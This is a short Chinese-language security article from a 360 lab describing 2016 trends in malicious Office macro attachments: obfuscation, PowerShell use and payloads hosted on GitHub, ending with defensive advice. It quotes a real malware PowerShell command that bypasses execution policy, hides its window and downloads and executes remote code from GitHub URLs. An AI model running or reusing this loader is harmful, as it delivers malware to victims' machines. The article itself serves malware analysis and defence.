# 近期恶意office宏附件的一些变化

阅读量 **107797**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-03-10 19:49:27

 **x**

##### 译文声明

本文是翻译文章，文章来源：360安全播报

译文仅供参考，具体内容表达以及含义原文为准。

**BY:Mickey@360网络攻防实验室**

**前言：**

office宏系列的恶意软件在原来不靠office,adobe漏洞的时代很流行，也许是漏洞的挖掘成本上升，现在的僵尸网络病毒，比如Dridex，又开始尝试用office宏来派发邮件附件，配合利用社会工程学技术，入侵个人或企业的网络。

现在的office恶意宏的趋势

**1.更加混淆**

比如看下面的混淆过的代码

变量不规则命名，字符串拆分，穿插垃圾字符，异或编码等是常见的技术，反混淆后如下：

可以看到是调用MSXML2.ServerXMLHTTP来实现HTTP的GET请求的功能函数

还有把代码直接存放到Forms表单的

**2.利用powershell**

随着winxp的不再被微软支持，使用win7及以后的版本用户逐渐增多，windows系统除了继续支持vbscript,bat等脚本语言实现任务批量处理后，又增加了powershell，powershell集成.net环境，功能更为强大。恶意软件当然也会盯着这个新功能。

其中的powershell代码为

powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit
-c if ([IntPtr]::size -eq 4) {(new-object
Net.WebClient).DownloadString('https://github.com/consfw/msfw/raw/master/README')
| iex } else {(new-object
Net.WebClient).DownloadString('https://github.com/consfw/msfw/raw/master/TODO')
| iex}"

这里的增加-ExecutionPolicy 是为了绕过默认powershel的安全提示，-WindowStyle Hidden
和-noprofile是为了不弹窗口。

**3.利用公共服务下载payload**

比如上面的代码利用github来下载payload ,也会利用[IntPtr]::size 来判断操作系统版本，如下

    
    
    if ([IntPtr]::size -eq 4) {
        (new-object Net.WebClient).DownloadString 
            ('https://github.com/consfw/msfw/raw/master/README') | iex
    } else {
        (new-object Net.WebClient).DownloadString 
            ('https://github.com/consfw/msfw/raw/master/TODO') | iex
    }

如果[IntPtr]::size等于4,就是32位的操作系统，就去下载[https://github.com/consfw/msfw/raw/master/README](https://github.com/consfw/msfw/raw/master/README)，如果是8，就是64位操作系统，就去下载[https://github.com/consfw/msfw/raw/master/TODO](https://github.com/consfw/msfw/raw/master/TODO)

**防护：**

关闭office的宏功能（默认就是关闭的）。不点击来历不明的邮件附件。企业培训员工提高安全意识

**参考文章：**

[http://labs.bromium.com/2015/12/03/a-micro-view-of-macro-malware/](http://labs.bromium.com/2015/12/03/a-micro-view-of-macro-malware/)

[http://labs.bromium.com/2016/03/09/macro-malware-connecting-to-github/](http://labs.bromium.com/2016/03/09/macro-malware-connecting-to-github/)

<http://blog.trendmicro.com/trendlabs-security-intelligence/macro-malware-strides-new-direction-uses-forms-store-code/>

本文翻译自360安全播报 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **360网络攻防实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/83615](/post/id/83615)

安全客 - 有思想的安全新媒体

本文转载自: [360安全播报]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg)
360网络攻防实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

